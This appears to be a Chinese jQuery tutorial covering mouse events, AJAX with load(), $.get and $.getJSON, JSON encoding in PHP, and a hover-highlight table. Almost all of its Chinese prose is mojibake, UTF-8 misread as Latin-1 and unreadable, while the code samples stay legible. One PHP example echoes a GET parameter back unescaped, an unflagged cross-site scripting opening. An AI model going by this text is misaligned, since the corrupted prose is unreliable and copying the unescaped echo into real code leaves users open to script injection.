å¯¹è±¡è¢«æ”¹å˜ï¼ˆå¦‚inputæ¡†ä¸­å†™å…¥ã€ä¿®æ”¹ã€åˆ é™¤æ–‡å­—æ—¶è§¦å‘æ­¤äº‹ä»¶ï¼‰ focus å¯¹è±¡è·å¾—ç„¦ç‚¹ï¼ˆå¦‚å…‰æ ‡è¿›å…¥textareaæ¡†è§¦å‘æ­¤äº‹ä»¶ï¼‰ blur å¯¹è±¡å¤±å»ç„¦ç‚¹ï¼ˆä¸focusäº‹ä»¶ç›¸å¯¹ï¼‰ load å¯¹è±¡åŠ è½½å®Œæˆï¼ˆå¦‚å›¾åƒè¢«åŠ è½½å®Œæˆæ—¶è§¦å‘æ­¤äº‹ä»¶ï¼‰ error å¯¹è±¡é‡åˆ°é”™è¯¯ ï¼ˆå¦‚å›¾åƒè¾“å…¥äº†ä¸€ä¸ªé”™è¯¯çš„åœ°å€ï¼Œæ²¡æœ‰æˆåŠŸåŠ è½½ï¼‰ mousemove é¼ æ ‡ç§»åŠ¨ ï¼ˆå½“é¼ æ ‡ç§»åŠ¨æ—¶è§¦å‘æ­¤äº‹ä»¶ï¼‰ è¯•è¯•mousemoveäº‹ä»¶ï¼Œè¿è¡Œè¿™æ®µä»£ç ï¼š &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/jquery/jquery.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function(){ $(document).mousemove(function(e){ $(&quot;span&quot;).text(e.pageX + &quot;, &quot; + e.pageY); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;é¼ æ ‡ä½äºåæ ‡ï¼š &lt;span&gt;&lt;/span&gt;.&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; å¯ä»¥çœ‹åˆ°ï¼Œé¼ æ ‡ç§»åŠ¨åå°±èƒ½è¾“å‡ºå½“å‰é¼ æ ‡æ‰€åœ¨çš„åæ ‡ã€‚å…¶ä¸­functionæœ‰ä¸€ä¸ªå‚æ•°eï¼Œæ¯ä¸ªäº‹ä»¶å‡½æ•°éƒ½æœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å°±æ˜¯æŒ‡è¯¥äº‹ä»¶æœ¬èº«ã€‚ï¼ˆå½“ç„¶è¿™ä¸ªå‚æ•°å¯ä»¥çœç•¥ï¼‰ï¼Œe.pageXå’Œe.pageYå°±æ˜¯æŒ‡é¼ æ ‡ä»¥ååé¼ æ ‡æ‰€åœ¨çš„ä½ç½®ã€‚ htmlæ“ä½œè¯¦è§£ é€‰æ‹©å™¨çš„ä½œç”¨æˆ‘è¯´äº†ï¼Œå°±æ˜¯å®Œæˆä¸ºäº†åé¢çš„æ“ä½œã€‚é™¤äº†ä¸ºé€‰æ‹©åˆ°çš„å¯¹è±¡æ·»åŠ ä¸€ä¸ªäº‹ä»¶å“åº”å‡½æ•°å¤–ï¼Œè¿˜èƒ½ç›´æ¥æ“ä½œæ­¤å¯¹è±¡ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„htmlæ“ä½œã€‚ æˆ‘ä¹Ÿåˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„htmlæ“ä½œæ–¹æ³•ï¼ˆæ›´è¯¦ç»†åœ°åœ¨w3schoolä¸­æŸ¥çœ‹ï¼‰ é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œæˆ‘ä»¬èƒ½åŠ¨æ€åœ°å¯¹htmlé¡µé¢è¿›è¡Œæ“ä½œã€‚å†ç»“åˆajaxï¼Œå°±å¯ä»¥åŠ¨æ€åœ°å‘æœåŠ¡å™¨è¯·æ±‚å†…å®¹ï¼Œå¹¶åœ¨ä¸åˆ·æ–°é¡µé¢çš„æƒ…å†µä¸‹æ›´æ–°é¡µé¢ä¸­ä¸€éƒ¨åˆ†ã€‚ ä»€ä¹ˆæ˜¯ajax ajaxæŒ‡å¼‚æ­¥javascriptã€‚ç›¸ä¿¡å¾ˆå¤šåŒå­¦åœ¨ç™¾åº¦ç™¾ç§‘é‡Œä¹Ÿçœ‹åˆ°äº†å®ƒçš„ç›¸å…³ä»‹ç»ï¼Œä¸è¿‡è¯´çš„æŒºå¤æ‚ï¼Œå„ç§å„æ ·çš„ä¸“ä¸šæœ¯è¯­ã€‚å¦‚æœåªæ˜¯åŸºç¡€ï¼Œæˆ‘ä»¬è¿™æ ·ç†è§£ajaxå¥½äº†ï¼šåˆ©ç”¨ajaxå¯ä»¥åŠ¨æ€åœ°ä»¥javascriptçš„æ–¹å¼å‘æœåŠ¡å™¨è¯·æ±‚æ•°æ®ï¼Œå¹¶æ¥å—æœåŠ¡å™¨å‘å›çš„æ•°æ®ï¼Œè¿™ä¸ªè¿‡ç¨‹æµè§ˆå™¨å¯ä»¥åšå…¶ä»–çš„ä»»ä½•å·¥ä½œï¼Œå¯ä»¥ä¸ç¦»å¼€é¡µé¢ï¼Œä¸åˆ·æ–°ã€‚ å…·ä½“æ¥è¯´å‘¢ï¼Ÿæˆ‘ä¸¾ä¸ªå°ä¾‹å­ï¼Œç°åœ¨æœ‰ä¸€ä¸ªæ³¨å†Œè¡¨å•ï¼Œè¦ç”¨æˆ·å¡«å†™ç”¨æˆ·åã€‚ä¸€èˆ¬éƒ½ä¼šæœ‰ä¸€ä¸ªâ€œæ£€æŸ¥æ˜¯å¦å·²è¢«å ç”¨â€é“¾æ¥ï¼Œç”¨æˆ·ç‚¹å‡»é“¾æ¥åï¼Œæµè§ˆå™¨æ‰“å¼€ä¸€ä¸ªæ–°é¡µé¢ï¼Œå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œåœ¨æ•°æ®åº“é‡Œå’¨è¯¢çœ‹ç”¨æˆ·åæ˜¯å¦å·²å­˜åœ¨ï¼Œå¾—åˆ°ç»“æœåè¿”å›åˆ°é¡µé¢é‡Œæç¤ºç”¨æˆ·ã€‚å¦‚æœä¸ç”¨ajaxï¼Œå¤§å®¶å¯ä»¥æƒ³è±¡ï¼Œç‚¹å‡»äº†é“¾æ¥ï¼Œæµè§ˆå™¨åŠ¿å¿…è¦æ‰“å¼€æ–°é¡µé¢ï¼Œç»™ç”¨æˆ·å¸¦æ¥ä¸ä¾¿ã€‚ä½†æ˜¯è¿ç”¨ajaxï¼Œç”¨æˆ·ç‚¹å‡»é“¾æ¥åï¼Œä¸æ‰“å¼€æ–°é¡µé¢ï¼Œè€Œç”±javascriptåœ¨åå°å‘æœåŠ¡å™¨è·å–ç»“æœï¼Œç„¶åç”¨ä¸€ä¸ªæç¤ºæ¡†å¼¹å‡ºæç¤ºç”¨æˆ·ï¼Œç”¨æˆ·åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è¿˜å¯ä»¥ç»§ç»­å¡«å†™è¡¨å•ï¼Œä¸¤ä¸ªè¿‡ç¨‹äº’ä¸å½±å“ã€‚é¡µé¢ä¸ä¼šè·³è½¬ï¼Œä¹Ÿä¸ä¼šåˆ·æ–°ï¼Œç”¨æˆ·ä¹‹å‰å¡«å†™çš„å†…å®¹ä¸ä¼šä¸¢å¤±ã€‚ è¿™å°±æ˜¯æ‰€è°“çš„å¼‚æ­¥ï¼Œç±»ä¼¼äºå¤šçº¿ç¨‹ã€‚ ç”šè‡³æˆ‘ä»¬åšä¸€ä¸ªç½‘ç«™ï¼Œæ”¾ä¸ŠèƒŒæ™¯éŸ³ä¹ï¼Œç½‘ç«™ä¸­ä¸€åˆ‡é“¾æ¥éƒ½ç”±ajaxå®Œæˆï¼ˆæ¯”å¦‚ç‚¹å‡»äº†ä¸€ç‰‡æ–‡ç« ï¼Œajaxå‘æœåŠ¡å™¨è¯·æ±‚æ–‡ç« å†…å®¹ï¼Œç„¶åç”¨æˆ‘ä¸Šæ¬¡è¯´çš„Jquery htmlæ“ä½œå°†ç½‘é¡µä¸­çš„ä¸€éƒ¨åˆ†è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ ·æ–‡ç« å°±æ”¾å…¥äº†é¡µé¢è€Œå¹¶ä¸åˆ·æ–°é¡µé¢ï¼‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„éŸ³ä¹å°±ä¸€ç›´ä¸ä¼šè¢«åˆ·æ–°ã€‚ æ‰€ä»¥è¯´ajaxæœ€å¤§çš„ä¼˜ç‚¹ï¼Œå°±æ˜¯åœ¨ä¸æ›´æ–°æ•´ä¸ªé¡µé¢çš„æƒ…å†µä¸‹å¯¹éƒ¨åˆ†å†…å®¹è¿›è¡Œä¿®æ”¹ã€ç»´æŠ¤ï¼Œè¿™æ ·æœåŠ¡å™¨å‘é€çš„æ•°æ®å°‘ï¼Œå‡å°‘äº†æœåŠ¡å™¨çš„è´Ÿæ‹…ã€‚ ç®€å•çš„ajaxè·å–ä¿¡æ¯ æ¥çœ‹çœ‹æˆ‘ä»¬ç”¨Jqueryæ€ä¹ˆå»ç»“åˆajaxã€‚ é¦–å…ˆçœ‹çœ‹æ€ä¹ˆè·å–æœåŠ¡å™¨ä¸Šä¸€ä¸ªtxtæ–‡ä»¶ï¼šä½¿ç”¨load()æ–¹æ³• (å› ä¸ºajaxä½¿ç”¨åŒæºç­–ç•¥ï¼Œæ‰€ä»¥åœ¨å“ªä¸ªç½‘ç«™è¿è¡Œä»£ç å°±åªèƒ½è¯·æ±‚è¯¥æœåŠ¡å™¨ä¸Šçš„å†…å®¹ï¼Œæˆ‘è¯·æ±‚çš„æ˜¯w3schoolä¸­çš„ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå¤§å®¶æŠŠä»£ç æ”¾åœ¨http://www.w3school.com.cn/tiy/t.asp?f=html_basicè¿è¡Œæ‰èƒ½çœ‹åˆ°æ•ˆæœ) &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt; &lt;/script&gt; &lt;script&gt; $(document).ready(function(){ $(&quot;#btn1&quot;).click(function(){ $(&apos;#test&apos;).load(&apos;http://www.w3school.com.cn/example/jquery/demo_test.txt&apos;); }) }) &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h3 id=&quot;test&quot;&gt;è¯·ç‚¹å‡»ä¸‹é¢çš„æŒ‰é’®ï¼Œé€šè¿‡ jQuery AJAX æ”¹å˜è¿™æ®µæ–‡æœ¬ã€‚&lt;/h3&gt; &lt;button id=&quot;btn1&quot; type=&quot;button&quot;&gt;è·å¾—å¤–éƒ¨çš„å†…å®¹&lt;/button&gt; &lt;/body&gt; &lt;/html&gt; å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œç‚¹å‡»æŒ‰é’®åæ–‡æœ¬è¢«æ”¹å˜ã€‚è¿™å…¶ä¸­æˆ‘è¯·æ±‚çš„å°±æ˜¯http://www.w3school.com.cn/example/jquery/demo_test.txtæ–‡ä»¶ã€‚çœ‹åˆ°Jqueryä»£ç ï¼Œå®ƒä¸ºæŒ‰é’®ç»‘å®šäº†clickäº‹ä»¶ï¼Œç‚¹å‡»æŒ‰é’®åï¼Œæ‰§è¡Œ$(â€˜#testâ€™).load(â€˜http://www.w3school.com.cn/example/jquery/demo_test.txtâ€˜); ä¹Ÿå°±æ˜¯è¯·æ±‚è¿™ä¸ªæ–‡æœ¬æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†id=testçš„å…ƒç´ å†…å®¹æ”¹å˜æˆè¯·æ±‚åˆ°çš„æ–‡æœ¬ã€‚ è¿™æ˜¯æœ€ç®€å•çš„ajaxï¼Œç®€å•åœ°è¯·æ±‚ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚æœ€å¸¸è§çš„ï¼Œæˆ‘ä»¬æ˜¯å‘ä¸€ä¸ªè„šæœ¬ï¼Œé€šè¿‡getæˆ–postè¯·æ±‚ä¸€ä¸ªhtmlæˆ–jsonã€‚ ajaxä½¿ç”¨getè¯·æ±‚å‘æœåŠ¡å™¨è¯·æ±‚htmlå†…å®¹ åˆå›åˆ°æˆ‘ä»¬å¼€å§‹çš„é‚£ä¸ªä¾‹å­ï¼Œåˆ¤æ–­ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ã€‚ æ¯”å¦‚æˆ‘ä»¬æœåŠ¡å™¨ä¸Šæœ‰è¿™æ ·ä¸€ä¸ªæ–‡ä»¶nameexists.php: &lt;?php $name = $_GET[&apos;act&apos;]; /* * *åœ¨æ•°æ®åº“ä¸­å’¨è¯¢ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ * */ $re = true; //å‡è®¾ç”¨æˆ·åå­˜åœ¨ if($re){ echo &quot;ç”¨æˆ·å $name å·²å­˜åœ¨&quot;; }else{ echo &quot;æ­å–œæ‚¨ï¼Œè¯¥ç”¨æˆ·åå¯ä»¥ä½¿ç”¨&quot;; } ?&gt; ç„¶åæˆ‘ä»¬æµè§ˆå™¨è¡¨å•å¦‚ä¸‹ï¼š &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; function sub(){ var name = $(&quot;#name&quot;).val(); $.get(&quot;nameexists.php&quot;, { &quot;act&quot;: name }, function(data, status){ if (status) {alert(data);} }); } &lt;/script&gt; &lt;form&gt; &lt;input type=&quot;text&quot; id=&quot;name&quot; /&gt; &lt;input type=&quot;button&quot; value=&quot;éªŒè¯&quot; onclick=&quot;sub();&quot;/&gt; &lt;/form&gt; å¤§å®¶è¯•éªŒå³å¯çœ‹åˆ°ï¼Œå½“ç‚¹å‡»â€œéªŒè¯â€åï¼Œå¼¹å‡ºæç¤ºæ¡† å¹¶æ²¡æœ‰åˆ·æ–°é¡µé¢ï¼Œæˆ‘ä»¬å¡«å†™çš„å†…å®¹ä¾æ—§åœ¨è¡¨å•ä¸­ã€‚è¿™å°±æ˜¯å‘æœåŠ¡å™¨è¯·æ±‚äº†htmlï¼Œè¿”å›çš„â€œç”¨æˆ·åâ€¦å·²å­˜åœ¨â€å°±æ˜¯ä¸€ä¸ªhtmlæ–‡æœ¬ï¼Œæœ€åä½“ç°åœ¨ç”¨æˆ·é¢å‰ã€‚ æˆ‘ä»¬çœ‹Jqueryä»£ç ã€‚è¿™æ˜¯ä¸€ä¸ªjavascriptå‡½æ•°ï¼Œå½“ç‚¹å‡»æŒ‰é’®æ—¶æ‰§è¡Œæ­¤å‡½æ•°ã€‚é¦–å…ˆé€‰æ‹©å™¨é€‰æ‹©äº†id=nameçš„æ–‡æœ¬æ¡†ï¼Œç”¨val()æ–¹æ³•è·å–å…¶å€¼ï¼Œå¹¶èµ‹å€¼ç»™nameå˜é‡ã€‚ çœ‹åé¢ï¼Œç”¨åˆ°äº†getæ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªå…¨å±€çš„æ–¹æ³•ï¼Œæ‰€ä»¥å†™æˆ$.getï¼Œè¿™ä¸ªæ–¹æ³•æœ‰ä¸‰ä¸ªå‚æ•°ï¼š$.get(url, data, callback); urlæ˜¯æˆ‘ä»¬è¦è¯·æ±‚çš„åœ°å€ï¼Œdataæ˜¯æˆ‘ä»¬è¦ä¼ é€’çš„å‚æ•°ï¼Œå†™æˆ{â€˜ç´¢å¼•1â€™:â€™å‚æ•°2â€™,â€™ç´¢å¼•2â€™:â€™å‚æ•°2â€™â€¦}çš„å½¢å¼ï¼Œä¹Ÿå¯ä»¥æŠŠä»–ä»¬ç›´æ¥å†™åœ¨urlåé¢: url?a=1&amp;b=2â€¦ ï¼ˆåªé€‚ç”¨äºgetè¯·æ±‚ï¼‰ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°callbackæ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åœ¨è·å–åˆ°æ•°æ®åè¿è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´æ”¶åˆ°çš„æ•°æ®å¯ä»¥åœ¨è¿™ä¸ªå‡½æ•°ä¸­å¤„ç†ã€‚å‡½æ•°åŸå‹ï¼šfunction(data,status,xhr) dataæ˜¯è·å¾—çš„è¿”å›æ•°æ®ï¼Œstatusæ˜¯çŠ¶æ€ï¼ˆæˆåŠŸæˆ–å¤±è´¥ï¼‰ï¼Œxhræ˜¯XMLHttpRequestå¯¹è±¡ï¼ˆæˆ‘è¿™é‡Œç”¨ä¸ä¸Šï¼‰ã€‚ æ‰€ä»¥å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ç›´æ¥æŠŠè·å¾—çš„è¿”å›æ•°æ®dataå¼¹å‡ºæ¥ï¼šalert(data)ã€‚è€Œæˆ‘ä»¬çœ‹åˆ°phpï¼Œå…¶å®è¿™ä¸ªdataå°±æ˜¯echoè¾“å‡ºçš„å†…å®¹ã€‚ ç±»ä¼¼äºgetæ–¹å¼ï¼Œpost()æ–¹æ³•å‚æ•°éƒ½ä¸getç›¸åŒï¼Œæˆ‘å°±ä¸ä¸¾ä¾‹å­äº†ã€‚è¿™æ˜¯è·å–çš„htmlå†…å®¹ï¼Œå…¶å®åœ¨javascriptä¸­ï¼Œæ›´å¤šçš„æ˜¯è·å–jsonï¼Œå†é€šè¿‡javascriptä»£ç å¤„ç†jsonæ¥æ˜¾ç¤ºç»™æˆ‘ä»¬ç”¨æˆ·çœ‹ã€‚ ä»€ä¹ˆæ˜¯json åˆåˆ°äº†æ™®åŠæ¦‚å¿µçš„æ—¶å€™ã€‚jsonæ˜¯ä¸€ç§javascriptåŸç”Ÿçš„æ•°æ®äº¤æ¢æ ¼å¼ã€‚ åœ¨äº’è”ç½‘ä¸Šï¼Œæœ€æ™®éçš„å°±æ˜¯æ•°æ®äº¤æ¢ã€‚æ¯”å¦‚åœ¨QQä¸Šï¼ŒAå‘Bå‘é€ä¸€ä¸ªæ•°å­—ï¼Œä¸€ä¸ªå­—æ¯æˆ–ä¸€å¥è¯ï¼Œæ¥å‘Šè¯‰BæŸäº›ä¿¡æ¯ã€‚ä½†æ˜¯æ•°å­—ã€å­—ç¬¦ä¸²å¾ˆå¥½ä¼ é€’ï¼Œæœ‰äº›å¯¹è±¡å´å¹¶ä¸é‚£ä¹ˆå®¹æ˜“ä¼ é€’ï¼Œæ¯”å¦‚æ•°ç»„ã€‚æˆ‘ä»¬æ€ä¹ˆæŠŠä¸€ä¸ªæ•°ç»„å¯¹è±¡é€šè¿‡QQå‘é€ç»™åˆ«äººï¼Ÿ æœ‰äº›äººå°±è¯´ï¼Œè¿™å¾ˆç®€å•å•Šï¼Œåœ¨phpé‡Œï¼Œä¸å°±æ˜¯â€œarray(1=&gt;â€™aâ€™,2=&gt;â€™bâ€™,3=&gt;â€™Câ€™);â€æˆ‘å°±æŠŠè¿™ä¸ªå­—ç¬¦ä¸²ç»™Bå‘é€è¿‡å»ï¼ŒBä¸€çœ‹å°±çŸ¥é“æ•°ç»„æ˜¯æ€ä¹ˆæ„æˆçš„äº†ã€‚å¯¹ï¼Œå…¶å®è¿™å°±æ˜¯ä¸€ç§æ•°æ®äº¤æ¢æ ¼å¼ï¼Œä¸è¿‡è¿™ä»…ä»…æ˜¯phpé‡Œå®šä¹‰æ•°ç»„çš„è¯­æ³•ï¼Œå¦‚æœBä¸æ‡‚phpï¼Œä»–ä¹Ÿè®¸å°±çœ‹ä¸æ‡‚ä½ ç»™ä»–å‘é€æ˜¯è¿™ä¸ªæ˜¯ä»€ä¹ˆæ„æ€ã€‚ æ‰€ä»¥å°±è¯ç”Ÿäº†jsonå’Œxmlä¸¤ç§é€šç”¨çš„æ•°æ®äº¤æ¢æ ¼å¼ã€‚æˆ‘ä¸è¯´xmlä¹Ÿä¸æ¯”è¾ƒäºŒè€…ï¼Œåªæ¥è¯´è¯´jsonã€‚å› ä¸ºjsonæ˜¯ä»javascriptå‘å±•å‡ºæ¥çš„ï¼Œæ‰€ä»¥ååˆ†é€‚åˆjavascriptã€‚æ¯”å¦‚åˆšæ‰çš„æ•°ç»„ï¼Œç”¨jsonå†™å‡ºæ¥ï¼š { &quot;1&quot;: &quot;a&quot;, &quot;2&quot;: &quot;b&quot;, &quot;3&quot;: &quot;C&quot; } è¿™æ ·çš„jsonèƒ½åœ¨ä»»ä½•javascriptä¸­è¢«è§£ææˆä¸€ä¸ªjsonå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡json.xxxæ¥å¾—åˆ°ç›¸åº”å†…å®¹ã€‚ ajaxçš„jsonæ–¹æ³• Jqueryä¸­ä»æœåŠ¡å™¨åŠ è½½jsonæ•°æ®çš„æ–¹æ³•æ˜¯ï¼š$.getJSON å®ƒçš„å‚æ•°ä¸get()æ–¹æ³•å®Œå…¨ä¸€æ ·ï¼Œä½†æ˜¯æœåŠ¡å™¨è¿”å›ç»“æœdataåº”è¯¥æ˜¯ä¸€ä¸ªjsonæ ¼å¼çš„å­—ç¬¦ä¸²ï¼ˆå¦‚æœä¸æ˜¯å°±å‡ºé”™ï¼‰ã€‚ æˆ‘è¯´äº†jsonæ˜¯ä¸€ä¸ªé€šç”¨çš„æ•°æ®äº¤æ¢ç¼–ç ï¼Œæ‰€ä»¥åœ¨phpé‡Œä¹Ÿæœ‰æ–¹æ³•æŠŠå¯¹è±¡å¤„ç†æˆjsonå­—ç¬¦ä¸²ã€‚åœ¨php5.2ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œæœ‰äº†ä¸€å¯¹å‡½æ•°json_encode()å’Œjson_decode()ï¼Œåˆ†åˆ«å¯¹phpä¸­å¯¹è±¡è¿›è¡Œjsonæ ¼å¼çš„ç¼–ç å’Œè§£ç ã€‚ ä¸¾ä¸ªæ²¡ä»€ä¹ˆè¥å…»çš„ä¾‹å­ã€‚ æœåŠ¡ç«¯ï¼š &lt;?php $arr = array(&apos;name&apos;=&gt;&apos;name&apos;, &apos;url&apos;=&gt;&quot;url&quot;, &apos;PR&apos;=&gt;0); echo json_encode($arr); ?&gt; æµè§ˆå™¨ï¼š &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; function sub(){ $.getJSON(&quot;test2.php&quot;, function(data, status){ if (status){ $(&quot;div&quot;).html(data.name + &apos; | &apos; + data.url + &apos; | &apos; + data.PR); } }); } &lt;/script&gt; &lt;form&gt; &lt;div&gt;&lt;/div&gt; &lt;input type=&quot;button&quot; value=&quot;æäº¤&quot; onclick=&quot;sub();&quot;/&gt; &lt;/form&gt; å¤§å®¶å¯ä»¥è¯•éªŒï¼Œç‚¹å‡»äº†æŒ‰é’®åï¼Œæ‰“å°å‡ºäº†phpä¸­å®šä¹‰çš„æ•°ç»„å†…å®¹ã€‚phpç«¯ä¸¤è¡Œä»£ç ï¼Œå®šä¹‰äº†ä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ç”¨json_encodeæŠŠæ•°ç»„åšæˆä¸€ä¸ªjsonç¼–ç çš„å­—ç¬¦ä¸²è¾“å‡ºã€‚ å†çœ‹Jqueryä»£ç ï¼Œå¤§å®¶ä¼šå‘ç°ï¼Œå®é™…ä¸Šè·å¾—çš„å†…å®¹æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬ç”¨ç‚¹å·è®¿é—®å¯¹è±¡ä¸­å†…å®¹ï¼šdata.name, data.url, data.PR. è¿™åªæ˜¯jsonçš„ç®€å•äº‹ä¾‹ï¼Œæ²¡ä»€ä¹ˆå®ç”¨æ€§ã€‚å¤§å®¶å¯ä»¥è¯•æƒ³ï¼Œå‡å¦‚å›¾ä¹¦é¦†æœ‰ä¸ªå›¾ä¹¦æ£€ç´¢ç³»ç»Ÿï¼Œç”¨æˆ·å‘æœåŠ¡å™¨è¯·æ±‚ä¹¦åï¼ŒæœåŠ¡å™¨æŸ¥è¯¢æ•°æ®åº“åæŠŠæ‰€æœ‰ç¬¦åˆæ¡ä»¶å›¾ä¹¦ä¿¡æ¯åšæˆä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œå†ç”¨jsonå½¢å¼å‘é€ç»™æµè§ˆå™¨ï¼ŒJqueryæŠŠä»–ä»¬ç¾åŒ–åè¾“å‡ºï¼Œè¿‡ç¨‹å¹¶ä¸å¤æ‚ã€‚ ä¸€ä¸ªé¼ æ ‡ç§»åŠ¨ä¸Šå»å°±å˜æ¢é¢œè‰²çš„è¡¨æ ¼ &lt;html&gt; &lt;head&gt; &lt;title&gt;è¡¨æ ¼1&lt;/title&gt; &lt;style&gt; table.hovertable { font-size:13px; color:#333333; border-width: 1px; border-color: #999999; border-collapse: collapse; width: 100%; } table.hovertable th { background-color:#c3dde0; border-width: 1px; padding: 8px; border-style: solid; border-color: #a9c6c9; text-align: left; } table.hovertable tr { background-color:#d4e3e5; } table.hovertable td { border-width: 1px; padding: 8px; border-style: solid; border-color: #a9c6c9; } &lt;/style&gt; &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(document).ready(function(){ $(&quot;.hovertable td&quot;).mouseover(function(event){ event.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;; }); $(&quot;.hovertable td&quot;).mouseout(function(event){ event.target.parentNode.style.backgroundColor = &quot;#d4e3e5&quot;; }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;table class=&quot;hovertable&quot;&gt; &lt;tr&gt;&lt;th&gt;æ ‡é¢˜&lt;/th&gt;&lt;th&gt;å†…å®¹&lt;/th&gt;&lt;th&gt;æ—¶é—´&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;aaa&lt;/td&gt;&lt;td&gt;15:30&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;bbb&lt;/td&gt;&lt;td&gt;17:40&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;ccc&lt;/td&gt;&lt;td&gt;13:35&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;ddd&lt;/td&gt;&lt;td&gt;08:53&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; å¤§å®¶ä¾æ—§æ˜¯æ”¾åˆ°http://www.w3school.com.cn/tiy/t.asp?f=jquery_hide è¿è¡Œï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå½“é¼ æ ‡ç§»åŠ¨åˆ°ç›¸åº”çš„è¡Œä¸Šçš„æ—¶å€™ï¼Œè¯¥è¡Œå˜è‰²ï¼Œå½“é¼ æ ‡ç§»èµ°æ—¶ï¼Œé¢œè‰²æ¢å¤ã€‚ è¿™ä¸ªæ•ˆæœç›¸ä¿¡å¤§å®¶åœ¨å¾ˆå¤šåœ°æ–¹è§åˆ°è¿‡ï¼Œæˆ‘è¿™é‡Œè¿ç”¨äº†Jqueryå’ŒHTML DOMä¸¤ç§æ–¹æ³•ç»“åˆã€‚è¿™å°±æ˜¯æˆ‘è¦è¯´çš„ä¸€ä¸ªé‡ç‚¹ã€‚ æˆ‘ä»¬çœ‹Jqueryä»£ç ï¼š$(&quot;.hovertable td&quot;).mouseoverï¼Œé€‰æ‹©äº†class=hovertableçš„å…ƒç´ çš„tdå­å…ƒç´ ï¼Œä¸ºä»–çš„mouseoveräº‹ä»¶ç»‘å®šä¸€ä¸ªå‡½æ•°ã€‚tdå…ƒç´ å°±æ˜¯è¡¨æ ¼ä¸­çš„ä¸€ä¸ªæ ¼å­ï¼Œmouseoveräº‹ä»¶æŒ‡â€œé¼ æ ‡ç§»åŠ¨åˆ°ä¸Šé¢â€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ç”¨æˆ·é¼ æ ‡ç§»åŠ¨åˆ°æ¯ä¸ªæ ¼å­ä¸Šï¼Œéƒ½ä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ï¼Œè¿›è€Œæ‰§è¡Œå‡½æ•°ä¸­çš„ä»£ç ã€‚ çœ‹åˆ°è¿™ä¸ªå‡½æ•°ä¸­çš„ä»£ç ï¼Œevent.target.parentNode.style.backgroundColor = &quot;#F0FFFF&quot;; eventæ˜¯ä»€ä¹ˆï¼Ÿæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œfunction(event)ï¼Œæ‰€ä»¥eventæ˜¯è¿™ä¸ªäº‹ä»¶ç»‘å®šå‡½æ•°çš„ä¸€ä¸ªå‚æ•°ï¼Œå®ƒæŒ‡çš„å°±æ˜¯â€œé¼ æ ‡æ è¿‡â€äº‹ä»¶å¯¹è±¡ã€‚ ä¸ºä»€ä¹ˆè¦ç”¨è¿™ä¸ªeventï¼Ÿå› ä¸ºæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œé¼ æ ‡ç§»åŠ¨åˆ°æŸä¸€è¡Œä¸Šï¼Œåªæœ‰è¿™ä¸€è¡Œçš„é¢œè‰²ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæˆ‘ä»¬å¿…é¡»çŸ¥é“é¼ æ ‡ç§»åŠ¨åˆ°å“ªä¸€è¡Œä¸Šäº†ï¼Œæ‰€ä»¥å¿…é¡»è·å¾—è¿™ä¸ªeventå¯¹è±¡ã€‚ eventå¯¹è±¡æœ‰å¦‚ä¸‹ä¸€äº›æ–¹æ³•æˆ–å±æ€§ï¼š 